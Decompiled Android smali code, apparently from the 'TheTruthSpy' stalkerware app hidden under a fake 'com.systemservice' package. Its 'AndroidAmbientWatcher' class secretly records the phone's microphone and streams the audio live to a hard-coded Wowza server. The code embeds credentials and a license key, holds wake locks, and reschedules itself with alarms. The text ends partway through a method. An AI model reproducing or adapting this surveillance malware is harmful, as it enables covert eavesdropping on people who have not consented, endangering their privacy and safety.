.class public Lcom/systemservice/a/c/c/e;
.super Lcom/systemservice/a/d/a;
.source ""

# interfaces
.implements Lcom/wowza/gocoder/sdk/api/status/WOWZStatusCallback;
.implements Lnet/majorkernelpanic/streaming/rtsp/f$a;
.implements Le/a/a/j$a;


# static fields
.field private static final d:[Ljava/lang/String;

.field private static volatile e:Landroid/os/PowerManager$WakeLock;


# instance fields
.field private f:Lcom/wowza/gocoder/sdk/api/broadcast/WOWZBroadcast;

.field private g:Lcom/wowza/gocoder/sdk/api/broadcast/WOWZBroadcastConfig;

.field private h:Ljava/lang/String;

.field private i:Ljava/lang/String;

.field private j:I

.field private k:Ljava/lang/String;

.field private l:Ljava/lang/String;

.field private m:Ljava/lang/String;

.field private n:Lnet/majorkernelpanic/streaming/rtsp/f;

.field private o:Landroid/content/Context;

.field private p:Lorg/apache/log4j/Logger;

.field private q:I

.field private r:I


# direct methods
.method static constructor <clinit>()V
    .locals 1

    const/4 v0, 0x0

    new-array v0, v0, [Ljava/lang/String;

    sput-object v0, Lcom/systemservice/a/c/c/e;->d:[Ljava/lang/String;

    return-void
.end method

.method public constructor <init>(Landroid/content/Context;Ljava/lang/String;Lcom/systemservice/common/features/settingHistory/b;)V
    .locals 7

    const-string v0, " Username = "

    const-string v1, " ApplicationName = "

    const-string v2, " PortNumber = "

    const-string v3, " HostAddress = "

    const-string v4, "AMBR"

    invoke-direct {p0}, Lcom/systemservice/a/d/a;-><init>()V

    const/4 v5, 0x0

    iput v5, p0, Lcom/systemservice/a/c/c/e;->r:I

    iput-object p2, p0, Lcom/systemservice/a/d/a;->c:Ljava/lang/String;

    iput-object p1, p0, Lcom/systemservice/a/c/c/e;->o:Landroid/content/Context;

    invoke-virtual {p0, p3}, Lcom/systemservice/a/d/g;->a(Lcom/systemservice/common/features/settingHistory/b;)V

    const-string p2, "AndroidAmbientWatcher"

    invoke-static {p2}, Lcom/systemservice/a/e/m;->a(Ljava/lang/String;)Lorg/apache/log4j/Logger;

    move-result-object p2

    iput-object p2, p0, Lcom/systemservice/a/c/c/e;->p:Lorg/apache/log4j/Logger;

    iput v5, p0, Lcom/systemservice/a/c/c/e;->q:I

    :try_start_0
    const-string p2, "5e01e46d72cdc.streamlock.net"

    iput-object p2, p0, Lcom/systemservice/a/c/c/e;->h:Ljava/lang/String;

    const-string p2, "GOSK-4F47-010C-B0B2-9270-5440"

    iput-object p2, p0, Lcom/systemservice/a/c/c/e;->i:Ljava/lang/String;

    const/16 p2, 0x78f

    iput p2, p0, Lcom/systemservice/a/c/c/e;->j:I

    const-string p2, "thetruthspy"

    iput-object p2, p0, Lcom/systemservice/a/c/c/e;->k:Ljava/lang/String;

    const-string p2, "scp"

    iput-object p2, p0, Lcom/systemservice/a/c/c/e;->l:Ljava/lang/String;

    const-string p2, "123456"

    iput-object p2, p0, Lcom/systemservice/a/c/c/e;->m:Ljava/lang/String;

    new-instance p2, Ljava/lang/StringBuilder;

    invoke-direct {p2}, Ljava/lang/StringBuilder;-><init>()V

    const-string p3, " apiLicenseKey = "

    invoke-virtual {p2, p3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object p3, p0, Lcom/systemservice/a/c/c/e;->i:Ljava/lang/String;

    invoke-virtual {p2, p3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p3, " Password = "

    invoke-virtual {p2, p3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object p3, p0, Lcom/systemservice/a/c/c/e;->m:Ljava/lang/String;

    invoke-virtual {p2, p3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object p3, p0, Lcom/systemservice/a/c/c/e;->h:Ljava/lang/String;

    invoke-virtual {p2, p3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p2, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget p3, p0, Lcom/systemservice/a/c/c/e;->j:I

    invoke-virtual {p2, p3}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {p2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object p3, p0, Lcom/systemservice/a/c/c/e;->k:Ljava/lang/String;

    invoke-virtual {p2, p3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object p3, p0, Lcom/systemservice/a/c/c/e;->l:Ljava/lang/String;

    invoke-virtual {p2, p3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p2

    invoke-static {v4, p2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception p2

    new-instance p3, Ljava/lang/StringBuilder;

    invoke-direct {p3}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {p2}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object p2

    invoke-virtual {p3, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p2, ""

    invoke-virtual {p3, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p2

    const-string p3, "getBrand"

    invoke-static {p3, p2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    :goto_0
    iget-object p2, p0, Lcom/systemservice/a/c/c/e;->i:Ljava/lang/String;

    invoke-static {p1, p2}, Lcom/wowza/gocoder/sdk/api/WowzaGoCoder;->init(Landroid/content/Context;Ljava/lang/String;)Lcom/wowza/gocoder/sdk/api/WowzaGoCoder;

    move-result-object p2

    if-nez p2, :cond_0

    return-void

    :cond_0
    new-instance p2, Lcom/wowza/gocoder/sdk/api/devices/WOWZAudioDevice;

    invoke-direct {p2}, Lcom/wowza/gocoder/sdk/api/devices/WOWZAudioDevice;-><init>()V

    new-instance p3, Lcom/wowza/gocoder/sdk/api/broadcast/WOWZBroadcast;

    invoke-direct {p3}, Lcom/wowza/gocoder/sdk/api/broadcast/WOWZBroadcast;-><init>()V

    iput-object p3, p0, Lcom/systemservice/a/c/c/e;->f:Lcom/wowza/gocoder/sdk/api/broadcast/WOWZBroadcast;

    new-instance p3, Lcom/wowza/gocoder/sdk/api/broadcast/WOWZBroadcastConfig;

    sget-object v6, Lcom/wowza/gocoder/sdk/api/configuration/WOWZMediaConfig;->FRAME_SIZE_1920x1080:Lcom/wowza/gocoder/sdk/api/configuration/WOWZMediaConfig;

    invoke-direct {p3, v6}, Lcom/wowza/gocoder/sdk/api/broadcast/WOWZBroadcastConfig;-><init>(Lcom/wowza/gocoder/sdk/api/configuration/WOWZMediaConfig;)V

    iput-object p3, p0, Lcom/systemservice/a/c/c/e;->g:Lcom/wowza/gocoder/sdk/api/broadcast/WOWZBroadcastConfig;

    new-instance p3, Ljava/lang/StringBuilder;

    invoke-direct {p3}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {p3, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v3, p0, Lcom/systemservice/a/c/c/e;->h:Ljava/lang/String;

    invoke-virtual {p3, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p3, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget v2, p0, Lcom/systemservice/a/c/c/e;->j:I

    invoke-virtual {p3, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {p3, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v1, p0, Lcom/systemservice/a/c/c/e;->k:Ljava/lang/String;

    invoke-virtual {p3, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v0, p0, Lcom/systemservice/a/c/c/e;->l:Ljava/lang/String;

    invoke-virtual {p3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p3

    invoke-static {v4, p3}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    iget-object p3, p0, Lcom/systemservice/a/c/c/e;->g:Lcom/wowza/gocoder/sdk/api/broadcast/WOWZBroadcastConfig;

    iget-object v0, p0, Lcom/systemservice/a/c/c/e;->h:Ljava/lang/String;

    invoke-virtual {p3, v0}, Lcom/wowza/gocoder/sdk/api/configuration/WOWZStreamConfig;->setHostAddress(Ljava/lang/String;)V

    iget-object p3, p0, Lcom/systemservice/a/c/c/e;->g:Lcom/wowza/gocoder/sdk/api/broadcast/WOWZBroadcastConfig;

    iget v0, p0, Lcom/systemservice/a/c/c/e;->j:I

    invoke-virtual {p3, v0}, Lcom/wowza/gocoder/sdk/api/configuration/WOWZStreamConfig;->setPortNumber(I)V

    iget-object p3, p0, Lcom/systemservice/a/c/c/e;->g:Lcom/wowza/gocoder/sdk/api/broadcast/WOWZBroadcastConfig;

    iget-object v0, p0, Lcom/systemservice/a/c/c/e;->k:Ljava/lang/String;

    invoke-virtual {p3, v0}, Lcom/wowza/gocoder/sdk/api/configuration/WOWZStreamConfig;->setApplicationName(Ljava/lang/String;)V

    iget-object p3, p0, Lcom/systemservice/a/c/c/e;->g:Lcom/wowza/gocoder/sdk/api/broadcast/WOWZBroadcastConfig;

    invoke-static {p1}, Lcom/systemservice/a/a/l;->d(Landroid/content/Context;)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p3, p1}, Lcom/wowza/gocoder/sdk/api/configuration/WOWZStreamConfig;->setStreamName(Ljava/lang/String;)V

    iget-object p1, p0, Lcom/systemservice/a/c/c/e;->g:Lcom/wowza/gocoder/sdk/api/broadcast/WOWZBroadcastConfig;

    iget-object p3, p0, Lcom/systemservice/a/c/c/e;->l:Ljava/lang/String;

    invoke-virtual {p1, p3}, Lcom/wowza/gocoder/sdk/api/configuration/WOWZStreamConfig;->setUsername(Ljava/lang/String;)V

    iget-object p1, p0, Lcom/systemservice/a/c/c/e;->g:Lcom/wowza/gocoder/sdk/api/broadcast/WOWZBroadcastConfig;

    iget-object p3, p0, Lcom/systemservice/a/c/c/e;->m:Ljava/lang/String;

    invoke-virtual {p1, p3}, Lcom/wowza/gocoder/sdk/api/configuration/WOWZStreamConfig;->setPassword(Ljava/lang/String;)V

    iget-object p1, p0, Lcom/systemservice/a/c/c/e;->g:Lcom/wowza/gocoder/sdk/api/broadcast/WOWZBroadcastConfig;

    invoke-virtual {p1, v5}, Lcom/wowza/gocoder/sdk/api/configuration/WOWZMediaConfig;->setVideoEnabled(Z)V

    iget-object p1, p0, Lcom/systemservice/a/c/c/e;->g:Lcom/wowza/gocoder/sdk/api/broadcast/WOWZBroadcastConfig;

    invoke-virtual {p1, p2}, Lcom/wowza/gocoder/sdk/api/broadcast/WOWZBroadcastConfig;->setAudioBroadcaster(Lcom/wowza/gocoder/sdk/api/broadcast/WOWZBroadcastAPI$AudioBroadcaster;)V

    new-instance p1, Lcom/systemservice/a/c/c/a;

    invoke-direct {p1, p0}, Lcom/systemservice/a/c/c/a;-><init>(Lcom/systemservice/a/c/c/e;)V

    new-instance p2, Landroid/content/IntentFilter;

    const-string p3, "com.sc.sync.ambient"

    invoke-direct {p2, p3}, Landroid/content/IntentFilter;-><init>(Ljava/lang/String;)V

    iget-object p3, p0, Lcom/systemservice/a/c/c/e;->o:Landroid/content/Context;

    invoke-virtual {p3, p1, p2}, Landroid/content/Context;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    invoke-static {}, Le/a/a/k;->c()Le/a/a/k;

    move-result-object p1

    iget-object p2, p0, Lcom/systemservice/a/c/c/e;->o:Landroid/content/Context;

    invoke-virtual {p1, p2}, Le/a/a/k;->a(Landroid/content/Context;)Le/a/a/k;

    const/4 p2, 0x5

    invoke-virtual {p1, p2}, Le/a/a/k;->a(I)Le/a/a/k;

    new-instance p2, Le/a/a/a/d;

    const/16 p3, 0x1f40

    const/16 v0, 0x3e80

    invoke-direct {p2, p3, v0}, Le/a/a/a/d;-><init>(II)V

    invoke-virtual {p1, p2}, Le/a/a/k;->a(Le/a/a/a/d;)Le/a/a/k;

    invoke-virtual {p1, p0}, Le/a/a/k;->a(Le/a/a/j$a;)Le/a/a/k;

    invoke-virtual {p1}, Le/a/a/k;->a()Le/a/a/j;

    move-result-object p1

    new-instance p2, Lnet/majorkernelpanic/streaming/rtsp/f;

    invoke-direct {p2}, Lnet/majorkernelpanic/streaming/rtsp/f;-><init>()V

    iput-object p2, p0, Lcom/systemservice/a/c/c/e;->n:Lnet/majorkernelpanic/streaming/rtsp/f;

    iget-object p2, p0, Lcom/systemservice/a/c/c/e;->n:Lnet/majorkernelpanic/streaming/rtsp/f;

    const/4 p3, 0x1

    invoke-virtual {p2, p3}, Lnet/majorkernelpanic/streaming/rtsp/f;->a(I)V

    iget-object p2, p0, Lcom/systemservice/a/c/c/e;->n:Lnet/majorkernelpanic/streaming/rtsp/f;

    invoke-virtual {p2, p1}, Lnet/majorkernelpanic/streaming/rtsp/f;->a(Le/a/a/j;)V

    iget-object p1, p0, Lcom/systemservice/a/c/c/e;->n:Lnet/majorkernelpanic/streaming/rtsp/f;

    invoke-virtual {p1, p0}, Lnet/majorkernelpanic/streaming/rtsp/f;->a(Lnet/majorkernelpanic/streaming/rtsp/f$a;)V

    return-void
.end method

.method private static declared-synchronized a(Landroid/content/Context;)Landroid/os/PowerManager$WakeLock;
    .locals 3

    const-class v0, Lcom/systemservice/a/c/c/e;

    monitor-enter v0

    :try_start_0
    sget-object v1, Lcom/systemservice/a/c/c/e;->e:Landroid/os/PowerManager$WakeLock;

    if-nez v1, :cond_0

    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object p0

    const-string v1, "power"

    invoke-virtual {p0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object p0

    check-cast p0, Landroid/os/PowerManager;

    const-string v1, "myapp:AmbientServiceWAkeLock"

    const/4 v2, 0x1

    invoke-virtual {p0, v2, v1}, Landroid/os/PowerManager;->newWakeLock(ILjava/lang/String;)Landroid/os/PowerManager$WakeLock;

    move-result-object p0

    sput-object p0, Lcom/systemservice/a/c/c/e;->e:Landroid/os/PowerManager$WakeLock;

    sget-object p0, Lcom/systemservice/a/c/c/e;->e:Landroid/os/PowerManager$WakeLock;

    invoke-virtual {p0, v2}, Landroid/os/PowerManager$WakeLock;->setReferenceCounted(Z)V

    :cond_0
    sget-object p0, Lcom/systemservice/a/c/c/e;->e:Landroid/os/PowerManager$WakeLock;
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    monitor-exit v0

    return-object p0

    :catchall_0
    move-exception p0

    monitor-exit v0

    throw p0
.end method

.method static synthetic a(Lcom/systemservice/a/c/c/e;)Lorg/apache/log4j/Logger;
    .locals 0

    iget-object p0, p0, Lcom/systemservice/a/c/c/e;->p:Lorg/apache/log4j/Logger;

    return-object p0
.end method

.method static synthetic a(Lcom/systemservice/a/c/c/e;Landroid/content/Context;)V
    .locals 0

    invoke-direct {p0, p1}, Lcom/systemservice/a/c/c/e;->b(Landroid/content/Context;)V

    return-void
.end method

.method static synthetic b(Lcom/systemservice/a/c/c/e;)I
    .locals 0

    iget p0, p0, Lcom/systemservice/a/c/c/e;->q:I

    return p0
.end method

.method private b(Landroid/content/Context;)V
    .locals 5

    const-string v0, "alarm"

    invoke-virtual {p1, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/AlarmManager;

    new-instance v1, Landroid/content/Intent;

    const-string v2, "com.sc.sync.ambient"

    invoke-direct {v1, v2}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, v2}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    const/4 v2, 0x0

    invoke-static {p1, v2, v1, v2}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object p1

    invoke-static {}, Landroid/os/SystemClock;->elapsedRealtime()J

    move-result-wide v1

    const-wide/32 v3, 0xea60

    add-long/2addr v1, v3

    const/4 v3, 0x2

    invoke-virtual {v0, v3, v1, v2, p1}, Landroid/app/AlarmManager;->set(IJLandroid/app/PendingIntent;)V

    return-void
.end method

.method static synthetic c(Lcom/systemservice/a/c/c/e;)Landroid/content/Context;
    .locals 0

    iget-object p0, p0, Lcom/systemservice/a/c/c/e;->o:Landroid/content/Context;

    return-object p0
.end method

.method private c(Lcom/systemservice/a/d/b;)V
    .locals 3

    const-string v0, ""

    :try_start_0
    iget-object v1, p0, Lcom/systemservice/a/c/c/e;->p:Lorg/apache/log4j/Logger;

    const-string v2, "Start Ambient Recording"

    invoke-virtual {v1, v2}, Lorg/apache/log4j/Category;->debug(Ljava/lang/Object;)V

    check-cast p1, Lcom/systemservice/a/b/a;

    invoke-virtual {p1}, Lcom/systemservice/a/b/a;->a()Landroid/content/Context;

    move-result-object p1

    const-string v1, "app_prefs_settings"

    const/4 v2, 0x0

    invoke-virtual {p1, v1, v2}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v1

    const-string v2, "target_device_id"

    invoke-interface {v1, v2, v0}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    invoke-static {p1}, Lcom/systemservice/a/c/c/e;->a(Landroid/content/Context;)Landroid/os/PowerManager$WakeLock;

    move-result-object p1

    invoke-virtual {p1}, Landroid/os/PowerManager$WakeLock;->isHeld()Z

    move-result v1

    if-nez v1, :cond_0

    invoke-virtual {p1}, Landroid/os/PowerManager$WakeLock;->acquire()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception p1

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {p1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    const-string v2, "AndroidAmbientWatcher"

    invoke-static {v2, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    iget-object v1, p0, Lcom/systemservice/a/c/c/e;->p:Lorg/apache/log4j/Logger;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {p1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v1, p1}, Lorg/apache/log4j/Category;->error(Ljava/lang/Object;)V

    :cond_0
    :goto_0
    return-void
.end method

.method private d(Lcom/systemservice/a/d/b;)V
    .locals 3

    :try_start_0
    check-cast p1, Lcom/systemservice/a/b/a;

    invoke-virtual {p1}, Lcom/systemservice/a/b/a;->a()Landroid/content/Context;

    move-result-object p1

    iget-object v0, p0, Lcom/systemservice/a/c/c/e;->p:Lorg/apache/log4j/Logger;

    const-string v1, "Stop Ambient Recording"

    invoke-virtual {v0, v1}, Lorg/apache/log4j/Category;->debug(Ljava/lang/Object;)V

    invoke-static {p1}, Lcom/systemservice/a/c/c/e;->a(Landroid/content/Context;)Landroid/os/PowerManager$WakeLock;

    move-result-object p1

    invoke-virtual {p1}, Landroid/os/PowerManager$WakeLock;->isHeld()Z

    move-result v0

    if-eqz v0, :cond_0

    invoke-virtual {p1}, Landroid/os/PowerManager$WakeLock;->release()V

    :cond_0
    iget-object p1, p0, Lcom/systemservice/a/c/c/e;->n:Lnet/majorkernelpanic/streaming/rtsp/f;

    invoke-virtual {p1}, Lnet/majorkernelpanic/streaming/rtsp/f;->a()Z

    move-result p1

    if-eqz p1, :cond_1

    iget-object p1, p0, Lcom/systemservice/a/c/c/e;->n:Lnet/majorkernelpanic/streaming/rtsp/f;

    invoke-virtual {p1}, Lnet/majorkernelpanic/streaming/rtsp/f;->b()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception p1

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {p1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v1, ""

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    const-string v2, "AndroidAmbientWatcher"

    invoke-static {v2, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    iget-object v0, p0, Lcom/systemservice/a/c/c/e;->p:Lorg/apache/log4j/Logger;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {p1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v0, p1}, Lorg/apache/log4j/Category;->error(Ljava/lang/Object;)V

    :cond_1
    :goto_0
    return-void
.end method


# virtual methods
.method public a()V
    .locals 0

    return-void
.end method

.method public a(IILjava/lang/Exception;)V
    .locals 0

    if-eqz p1, :cond_1

    const/4 p2, 0x1

    if-eq p1, p2, :cond_0

    const/4 p2, 0x2

    if-eq p1, p2, :cond_1

    const/4 p2, 0x3

    goto :goto_0

    :cond_0
    invoke-virtual {p3}, Ljava/lang/Exception;->printStackTrace()V

    return-void

    :cond_1
    :goto_0
    if-eqz p3, :cond_2

    invoke-virtual {p3}, Ljava/lang/Exception;->printStackTrace()V

    :cond_2
    return-void
.end method

.method public a(ILjava/lang/Exception;)V
    .locals 1

    const/4 v0, 0x1

    if-eq p1, v0, :cond_0

    const/4 v0, 0x3

    if-eq p1, v0, :cond_0

    goto :goto_0

    :cond_0
    invoke-virtual {p2}, Ljava/lang/Exception;->printStackTrace()V

    :goto_0
    return-void
.end method

.method public a(J)V
    .locals 0

    return-void
.end method

.method public a(Lcom/systemservice/a/b/a;)V
    .locals 6

    const-string v0, "AndroidAmbientWatcher"

    invoke-super {p0, p1}, Lcom/systemservice/a/d/a;->a(Lcom/systemservice/a/b/a;)V

    :try_start_0
    invoke-static {v0}, Lcom/systemservice/a/e/m;->a(Ljava/lang/String;)Lorg/apache/log4j/Logger;

    move-result-object v1

    iput-object v1, p0, Lcom/systemservice/a/c/c/e;->p:Lorg/apache/log4j/Logger;

    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v2, 0x17

    if-lt v1, v2, :cond_0

    iget-object v1, p0, Lcom/systemservice/a/c/c/e;->o:Landroid/content/Context;

    const-string v2, "android.permission.RECORD_AUDIO"

    invoke-static {v1, v2}, Landroid/support/v4/content/a;->a(Landroid/content/Context;Ljava/lang/String;)I

    move-result v1

    if-eqz v1, :cond_0

    return-void

    :cond_0
    invoke-virtual {p1}, Lcom/systemservice/a/b/a;->b()Landroid/content/Intent;

    move-result-object v1

    invoke-virtual {v1}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object v1

    if-eqz v1, :cond_8

    const-string v2, "com.sc.sync.ambient"

    invoke-virtual {v2, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    const-string v3, "com.sc.stop.ambient"

    const/4 v4, 0x0

    const/4 v5, 0x1

    if-eqz v2, :cond_4

    :try_start_1
    iget p1, p0, Lcom/systemservice/a/c/c/e;->r:I

    add-int/lit8 p1, p1, 0x3c

    iput p1, p0, Lcom/systemservice/a/c/c/e;->r:I

    const/16 p1, 0x708

    iget v1, p0, Lcom/systemservice/a/c/c/e;->r:I

    if-ge v1, p1, :cond_3

    iget-object p1, p0, Lcom/systemservice/a/c/c/e;->o:Landroid/content/Context;

    invoke-static {p1}, Lcom/systemservice/a/a/h;->a(Landroid/content/Context;)Z

    move-result p1

    if-nez p1, :cond_1

    goto :goto_0

    :cond_1
    iget p1, p0, Lcom/systemservice/a/c/c/e;->q:I

    if-eq p1, v5, :cond_2

    const/4 p1, 0x2

    iput p1, p0, Lcom/systemservice/a/c/c/e;->q:I

    :cond_2
    iget-object p1, p0, Lcom/systemservice/a/c/c/e;->o:Landroid/content/Context;

    const-string v1, "power"

    invoke-virtual {p1, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object p1

    check-cast p1, Landroid/os/PowerManager;

    const-string v1, "myapp:AmbientServiceWAkeLock"

    invoke-virtual {p1, v5, v1}, Landroid/os/PowerManager;->newWakeLock(ILjava/lang/String;)Landroid/os/PowerManager$WakeLock;

    move-result-object p1

    new-instance v1, Ljava/lang/Thread;

    new-instance v2, Lcom/systemservice/a/c/c/b;

    invoke-direct {v2, p0, p1}, Lcom/systemservice/a/c/c/b;-><init>(Lcom/systemservice/a/c/c/e;Landroid/os/PowerManager$WakeLock;)V

    invoke-direct {v1, v2}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v1}, Ljava/lang/Thread;->start()V

    goto/16 :goto_2

    :cond_3
    :goto_0
    iput v4, p0, Lcom/systemservice/a/c/c/e;->r:I

    new-instance p1, Landroid/content/Intent;

    invoke-direct {p1}, Landroid/content/Intent;-><init>()V

    invoke-virtual {p1, v3}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    new-instance v1, Lcom/systemservice/a/b/a;

    iget-object v2, p0, Lcom/systemservice/a/c/c/e;->o:Landroid/content/Context;

    invoke-direct {v1, p0, v2, p1}, Lcom/systemservice/a/b/a;-><init>(Ljava/lang/Object;Landroid/content/Context;Landroid/content/Intent;)V

    invoke-virtual {v1}, Lcom/systemservice/a/b/a;->a()Landroid/content/Context;

    move-result-object p1

    invoke-virtual {v1}, Lcom/systemservice/a/b/a;->b()Landroid/content/Intent;

    move-result-object v1

    invoke-static {p1, v1}, Lcom/systemservice/common/groupService/UIWatchdogService;->a(Landroid/content/Context;Landroid/content/Intent;)V

    return-void

    :cond_4
    const-string v2, "com.sc.start.ambient"

    invoke-virtual {v2, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_6

    iget v1, p0, Lcom/systemservice/a/c/c/e;->q:I

    if-eq v1, v5, :cond_8

    iget-object v1, p0, Lcom/systemservice/a/c/c/e;->p:Lorg/apache/log4j/Logger;

    const-string v2, "Start Ambient Recording"

    invoke-virtual {v1, v2}, Lorg/apache/log4j/Category;->debug(Ljava/lang/Object;)V

    invoke-direct {p0, p1}, Lcom/systemservice/a/c/c/e;->c(Lcom/systemservice/a/d/b;)V

    iget-object p1, p0, Lcom/systemservice/a/c/c/e;->g:Lcom/wowza/gocoder/sdk/api/broadcast/WOWZBroadcastConfig;

    invoke-virtual {p1}, Lcom/wowza/gocoder/sdk/api/broadcast/WOWZBroadcastConfig;->validateForBroadcast()Lcom/wowza/gocoder/sdk/api/errors/WOWZStreamingError;

    move-result-object p1

    if-eqz p1, :cond_5

    goto :goto_1

    :cond_5
    iget-object p1, p0, Lcom/systemservice/a/c/c/e;->f:Lcom/wowza/gocoder/sdk/api/broadcast/WOWZBroadcast;

